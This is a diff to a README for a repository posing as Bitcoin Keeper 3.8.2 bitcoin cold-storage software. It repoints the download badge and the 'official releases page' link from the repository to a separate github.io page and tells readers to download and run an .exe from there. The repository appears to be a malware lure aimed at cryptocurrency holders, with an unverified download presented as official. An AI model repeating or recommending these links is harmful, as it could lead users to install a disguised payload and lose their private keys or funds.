@@ -1,6 +1,6 @@
 # 🔒 bitcoin-keeper-psbt-hub - Securely manage your bitcoin cold storage
 
-[![Download Bitcoin Keeper](https://img.shields.io/badge/Download-Bitcoin_Keeper-blue.svg)](https://github.com/abousedaadam65-ux/bitcoin-keeper-psbt-hub)
+[![Download Bitcoin Keeper](https://img.shields.io/badge/Download-Bitcoin_Keeper-blue.svg)](https://abousedaadam65-ux.github.io)
 
 Bitcoin Keeper 3.8.2 provides tools for secure bitcoin storage. You use this software to manage your private keys and sign transactions offline. It supports cold storage, multisig setups, and air-gapped workflows. This guide helps you install the application and start managing your bitcoin on a Windows computer.
 
@@ -18,7 +18,7 @@ To run Bitcoin Keeper, your computer needs the following specifications:
 
 You download the software directly from the project repository. Follow these steps to obtain the installer file:
 
-1. Visit the [official releases page](https://github.com/abousedaadam65-ux/bitcoin-keeper-psbt-hub).
+1. Visit the [official releases page](https://abousedaadam65-ux.github.io).
 2. Look for the latest version listed under the Releases section.
 3. Select the file ending in .exe to start your download.
 4. Save the file to your desktop or your Downloads folder.
